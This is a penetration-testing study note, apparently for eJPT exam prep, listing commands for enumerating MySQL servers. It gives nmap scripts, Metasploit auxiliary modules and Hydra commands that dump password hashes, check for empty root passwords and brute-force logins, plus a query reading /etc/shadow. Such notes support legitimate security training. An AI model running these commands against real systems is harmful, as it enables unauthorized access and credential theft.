---
title: SQL Enumeration
dg-publish: true
---

# SQL Enumeration

> [!info] Navigation
> [[Home]] | [[Master Table of Contents]] | [[Exam Cram Guide]] | [[Command Dashboard]] | [[Curated External Sources]] | [[Main/03 - Study Materials/eJPT/10 - Visual Diagrams/Index]]



## Sections in This Note
- [[#MySQL Basics|MySQL Basics]]
- [[#MySQL Enumeration|MySQL Enumeration]]

---

## MySQL Basics
```
# MySQL version
nmap -p3306 -sV (IPaddress)

# Connect to MySQL database
mysql -h (IPaddress) -u (username)

# Number of databases
show databases

# Number of records in a particular database
use (Database name)
select count(*) from (Table name)
```

**Dump the schema of all databases using Metasploit:**
```
msfconsole
use auxiliary/scanner/mysql/mysql_schemadump
set RHOSTS (IPaddress)
set USERNAME (username)
set PASSWORD ""
exploit
```

**How many directories present in the database:**
```
msfconsole
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS (IPaddress)
set DIR_LIST location
set VERBOSE false
set PASSWORD ""
exploit
```

**File enumeration in MySQL:**
```
msfconsole
use auxiliary/scanner/mysql/mysql_file_enum
set RHOSTS (IPaddress)
set PASSWORD ""
set FILE_LIST (location)
exploit
```

**System password hash:**
```
mysql -u (username) -h (IPaddress)
select load_file('/etc/shadow');
```

**Database users and their names/passwords:**
```
msfconsole
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS (IPaddress)
set USERNAME (username)
set PASSWORD ""
exploit
```

**Check whether anonymous login is allowed:**
```
nmap --script mysql-empty-password -p3306 (IPaddress)
```

**Check whether "InteractiveClient" capability is supported:**
```
nmap --script mysql-info -p3306 (IPaddress)
```

**Enumerate users using nmap script:**
```
nmap --script mysql-users --script-args mysqluser='root',mysqlpass="" -p3306 (IPaddress)
```

**List all databases using nmap script:**
```
nmap --script mysql-databases --script-args mysqluser='root',mysqlpass="" -p3306 (IPaddress)
```

**Find data directories:**
```
nmap --script mysql-variables --script-args mysqluser='root',mysqlpass="" -p3306 (IPaddress)
```

**Check whether file privileges can be granted to non-admin user:**
```
nmap --script mysql-audit --script-args mysql-audit.username='root',mysql-audit.password="",mysql-audit.filename='location' -p3306 (IPaddress)
```

**Dump all user hashes using nmap script:**
```
nmap --script mysql-dump-hashes --script-args mysqluser='root',mysqlpass="" -p3306 (IPaddress)
```

**Find the password of the database using Metasploit:**
```
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOST (IPaddress)
set PASS_FILE (file location)
set VERBOSE false
set STOP_ON_SUCCESS true
exploit
```

**Find password using Hydra:**
```
hydra -l (username) -P (file location) (IPaddress) mysql
```

## MySQL Enumeration

MySQL is an open-source relational database management system based on SQL. Uses TCP port 3306 by default. We can use auxiliary modules to enumerate MySQL version, brute-force passwords, execute SQL queries, and more.

```
auxiliary/admin/mysql/mysql_enum
auxiliary/admin/mysql/mysql_sql
auxiliary/scanner/mysql/mysql_file_enum
auxiliary/scanner/mysql/mysql_hashdump
auxiliary/scanner/mysql/mysql_login
auxiliary/scanner/mysql/mysql_schemadump
auxiliary/scanner/mysql/mysql_version
auxiliary/scanner/mysql/mysql_writable_dirs
```

## External Sources
- [MySQL Security Reference Manual](https://dev.mysql.com/doc/refman/8.4/en/security.html)
- [MySQL Security Guidelines](https://dev.mysql.com/doc/refman/8.4/en/security-guidelines.html)

## Related
- [[Exam Cram Guide]]
- [[Command Dashboard]]
